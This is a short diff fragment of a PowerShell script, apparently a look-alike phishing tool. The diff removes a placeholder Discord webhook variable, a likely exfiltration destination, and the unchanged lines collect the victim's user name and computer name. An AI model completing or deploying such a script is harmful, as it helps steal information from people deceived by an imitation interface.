@@ -16,8 +16,6 @@ The HTML for this script has been modified but was originally from - https://git
 Kudos for creating this great look-a-like! 
 #>
 
-$dc = 'DISCORD_WEBHOOK_HERE'
-
 # GATHER SYSTEM AND USER INFO
 $u = (Get-WmiObject Win32_UserAccount -Filter "Name = '$Env:UserName'").FullName
 $c = $env:COMPUTERNAME
